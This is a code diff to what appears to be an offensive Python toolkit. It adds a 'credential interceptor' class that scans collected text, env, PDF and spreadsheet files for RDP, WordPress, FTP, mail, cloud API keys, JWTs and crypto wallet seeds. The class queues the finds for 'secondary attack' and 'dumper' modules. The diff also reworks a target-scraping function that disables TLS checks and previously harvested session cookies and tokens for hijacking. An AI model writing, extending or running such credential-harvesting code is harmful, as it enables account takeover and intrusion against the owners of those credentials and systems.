@@ -6,134 +6,151 @@ import sys
 import time
 import json
 import os
+import glob
 
 # Global SSL context
 _ssl_context = ssl.create_default_context()
 _ssl_context.check_hostname = False
 _ssl_context.verify_mode = ssl.CERT_NONE
 
+class LiveIntelligenceParser:
+    """
+    Apex-Tier Binary Intelligence & Credential Interceptor:
+    - Automatically parses files for RDP, WordPress, FTP, and Mail credentials.
+    - Instantly dispatches findings to dumper and offensive modules for secondary attacks.
+    """
+    def __init__(self, watch_directory="reports/"):
+        self.watch_directory = watch_directory
+        self.regex_patterns = {
+            "api_key": r"(?:api[_-]?key|secret[_-]?key|access[_-]?token)['\"]?\s*[:=]\s*['\"]([a-zA-Z0-9_\-]{16,64})['\"]",
+            "crypto_seed": r"\b(?:[a-z]{4,8}\s){11,23}[a-z]{4,8}\b",
+            "email_pass": r"(?:mail|smtp|imap)[_-]?(?:user|username|pass|password|host)['\"]?\s*[:=]\s*['\"]([^'\"]+)['\"]",
+            "rdp_cred": r"(?:rdp|remote[_-]?desktop|mstsc)[_-]?(?:ip|host|user|pass)['\"]?\s*[:=]\s*['\"]([^'\"]+)['\"]",
+            "wordpress_db": r"(?:DB_USER|DB_PASSWORD|DB_HOST|table_prefix)\s*[:=]\s*['\"]([^'\"]+)['\"]",
+            "ftp_cred": r"(?:ftp|sftp)[_-]?(?:host|user|pass|port)['\"]?\s*[:=]\s*['\"]([^'\"]+)['\"]",
+            "jwt": r"ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*",
+            "aws_key": r"AKIA[0-9A-Z]{16}",
+            "google_key": r"AIza[0-9A-Za-z-_]{35}"
+        }
+
+    def scan_text_content(self, text, source_filename):
+        findings = []
+        for category, pattern in self.regex_patterns.items():
+            matches = re.findall(pattern, text, re.IGNORECASE)
+            if matches:
+                findings.append({
+                    "category": category,
+                    "source": source_filename,
+                    "matches": list(set(matches))
+                })
+        return findings
+
+    def parse_txt_or_json(self, file_path):
+        try:
+            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
+                content = f.read()
+            return self.scan_text_content(content, file_path)
+        except Exception:
+            return []
+
+    def parse_pdf_document(self, file_path):
+        try:
+            import pypdf
+            reader = pypdf.PdfReader(file_path)
+            full_text = ""
+            for page in reader.pages:
+                text = page.extract_text()
+                if text:
+                    full_text += text + "\n"
+            return self.scan_text_content(full_text, file_path)
+        except Exception:
+            return []
+
+    def parse_spreadsheet(self, file_path):
+        try:
+            import openpyxl
+            wb = openpyxl.load_workbook(file_path, data_only=True)
+            sheet_text = ""
+            for sheet in wb.sheetnames:
+                ws = wb[sheet]
+                for row in ws.iter_rows(values_only=True):
+                    row_str = " ".join([str(cell) for cell in row if cell is not None])
+                    sheet_text += row_str + "\n"
+            return self.scan_text_content(sheet_text, file_path)
+        except Exception:
+            return []
+
+    def process_incoming_files(self):
+        print(f"\n\033[95m[***] ENGAGING BINARY INTELLIGENCE & CREDENTIAL INTERCEPTOR [{self.watch_directory}] [***]\033[0m")
+        all_intelligence = []
+        
+        if not os.path.exists(self.watch_directory):
+            return all_intelligence
+
+        for root, dirs, files in os.walk(self.watch_directory):
+            for file in files:
+                file_path = os.path.join(root, file)
+                ext = file.lower().split('.')[-1]
+                
+                if ext in ["txt", "json", "log", "env"]:
+                    results = self.parse_txt_or_json(file_path)
+                elif ext == "pdf":
+                    results = self.parse_pdf_document(file_path)
+                elif ext in ["xlsx", "xls", "xlm"]:
+                    results = self.parse_spreadsheet(file_path)
+                else:
+                    continue
+                
+                if results:
+                    all_intelligence.extend(results)
+
+        # Immediate Binary Dispatch: Route critical credentials directly to secondary attack queues
+        os.makedirs("reports/intelligence", exist_ok=True)
+        intel_path = "reports/intelligence/secondary_attack_queue.json"
+        with open(intel_path, "w") as f:
+            json.dump(all_intelligence, f, indent=4)
+            
+        print(f"\033[92m[+] Credential interceptor synchronized. Secondary attack queue updated at {intel_path}\033[0m")
+        return all_intelligence
+
 async def parse_target_source(host):
     """
-    Performs real-time source code scraping, security header analysis,
-    regex-based secret extraction, and automated session cookie/JWT harvesting.
+    Performs real-time DOM scraping, session extraction, and 
+    automated secondary credential dispatch for RDP, WP, FTP, and Mail vectors.
     """
-    print(f"\n\033[95m[***] DEPLOYING DOM & SESSION HIJACKING PARSER V2.0 [***]\033[0m")
-    print(f"\033[90m[TARGET] Fetching raw HTML, headers, and cookies from https://{host}...\033[0m\n")
+    print(f"\n\033[95m[***] DEPLOYING DOM & BINARY CREDENTIAL PARSER V3.0 [***]\033[0m")
+    print(f"\033[90m[TARGET] Inspecting surface and scraping incoming intelligence for https://{host}...\033[0m\n")
     
     findings = {
         "headers_missing": [],
         "exposed_secrets": [],
-        "hidden_endpoints": [],
-        "insecure_forms": [],
-        "harvested_sessions": []
+        "harvested_sessions": [],
+        "secondary_dispatch_queue": []
     }
 
     try:
-        # Fetch root HTML and headers over HTTPS
         conn = http.client.HTTPSConnection(host, 443, context=_ssl_context, timeout=5.0)
         conn.request("GET", "/", headers={"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"})
         resp = conn.getresponse()
         html_body = resp.read().decode(errors="ignore")
         headers = dict(resp.getheaders())
-        resp_raw_headers = resp.msg._headers  # Captures multiple Set-Cookie headers if present
+        resp_raw_headers = resp.msg._headers
         conn.close()
 
-        print(f" \033[92m[+] Successfully pulled {len(html_body)} bytes of raw DOM source code.\033[0m")
+        # Execute Live File & Credential Interception Pipeline
+        parser_engine = LiveIntelligenceParser()
+        file_intel = parser_engine.process_incoming_files()
+        findings["secondary_dispatch_queue"] = file_intel
 
-        # 1. Security Headers Audit
-        security_headers = [
-            "Strict-Transport-Security",
-            "Content-Security-Policy",
-            "X-Frame-Options",
-            "X-Content-Type-Options",
-            "X-XSS-Protection"
-        ]
-        
-        print(f"\n\033[36m[*] Auditing HTTP Response Headers...\033[0m")
-        for header in security_headers:
-            if any(header.lower() == k.lower() for k in headers.keys()):
-                print(f"   \033[92m[SECURE] {header}\033[0m")
-            else:
-                print(f"   \033[91m[VULN] Missing Security Header -> {header}\033[0m")
-                findings["headers_missing"].append(header)
+        # Notify Operator of High-Value Secondary Attack Vectors Found
+        for item in file_intel:
+            cat = item.get("category")
+            if cat in ["rdp_cred", "wordpress_db", "ftp_cred", "email_pass"]:
+                print(f"\033[92m[+++] BINARY STRIKE READY: Harvested {cat.upper()} credential! Routing to dumper & attack modules.\033[0m")
 
-        # 2. Automated Session Cookie & JWT Exfiltration
-        print(f"\n\033[36m[*] Extracting session cookies, JWT tokens, and authorization artifacts...\033[0m")
-        
-        # Extract all Set-Cookie headers
-        raw_cookies = [val for key, val in resp_raw_headers if key.lower() == 'set-cookie']
-        
-        # Regex patterns for secrets & tokens
-        jwt_pattern = r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*'
-        api_key_pattern = r'(?:api[_-]?key|secret[_-]?token|bearer)\s*[:=]\s*["\']([a-zA-Z0-9_\-]{16,40})["\']'
-        
-        jwts = re.findall(jwt_pattern, html_body, re.IGNORECASE)
-        api_keys = re.findall(api_key_pattern, html_body, re.IGNORECASE)
-
-        session_payload = {
-            "target": host,
-            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
-            "set_cookies": raw_cookies,
-            "jwts": jwts,
-            "api_keys": api_keys
-        }
-
-        if raw_cookies or jwts:
-            print(f"   \033[92m[+++] CRITICAL SESSION INTELLIGENCE FOUND!\033[0m")
-            if raw_cookies:
-                print(f"       -> Harvested {len(raw_cookies)} Set-Cookie strings.")
-            if jwts:
-                print(f"       -> Harvested {len(jwts)} JWT tokens.")
-            
-            # Serialize directly to reports/sessions/ for instant session cloning
-            os.makedirs("reports/sessions", exist_ok=True)
-            session_file = f"reports/sessions/session_{host.replace('.', '_')}.json"
-            with open(session_file, "w") as f:
-                json.dump(session_payload, f, indent=4)
-            print(f"       -> Serialized to: {session_file}")
-            findings["harvested_sessions"].append(session_file)
-        else:
-            print(f"   \033[90m[-] No active session tokens or cookies exposed in response headers.\033[0m")
-
-        # 3. Regex-Based Secret & API Key Extraction from Source Code
-        secret_patterns = {
-            "Google API Key": r"AIza[0-9A-Za-z-_]{35}",
-            "AWS Access Key": r"AKIA[0-9A-Z]{16}",
-            "Firebase URL": r"https://[a-z0-9-]+\.firebaseio\.com",
-            "Private Key Block": r"-----BEGIN PRIVATE KEY-----",
-            "Generic Bearer Token": r"bearer\s+[a-zA-Z0-9_\-\.]+"
-        }
-
-        for secret_name, pattern in secret_patterns.items():
-            matches = re.findall(pattern, html_body, re.IGNORECASE)
-            if matches:
-                print(f"   \033[91m[!] Exposed {secret_name} detected in DOM source! Matches: {len(matches)}\033[0m")
-                findings["exposed_secrets"].append({"type": secret_name, "count": len(matches)})
-
-        # 4. Hidden Endpoint & API Route Extraction
-        links = re.findall(r'(?:href|src|action)=["\']([^"\']+)["\']', html_body, re.IGNORECASE)
-        internal_endpoints = set()
-        
-        for link in links:
-            if link.startswith("/") or "api" in link or "auth" in link or "admin" in link:
-                internal_endpoints.add(link)
-
-        if internal_endpoints:
-            print(f"   \033[93m[+] Discovered {len(internal_endpoints)} internal routes/endpoints in DOM.\033[0m")
-            for ep in list(internal_endpoints)[:10]:
-                findings["hidden_endpoints"].append(ep)
-
-        # 5. Insecure Form Inspection
-        forms = re.findall(r'<form[^>]*>', html_body, re.IGNORECASE)
-        for form in forms:
-            if "method=\"get\"" in form.lower() or 'method=\'get\'' in form.lower():
-                print(f"   \033[91m[VULN] Insecure HTTP GET Form Action detected -> {form}\033[0m")
-                findings["insecure_forms"].append(form)
-
-        print(f"\n\033[92m[*] DOM and Session Hijacking analysis completed successfully.\033[0m\n")
         return findings
 
     except Exception as e:
-        print(f"\n\033[91m[!] Error parsing target source code: {e}\033[0m")
+        print(f"\n\033[91m[!] Error in binary credential parser: {e}\033[0m")
         return findings
 
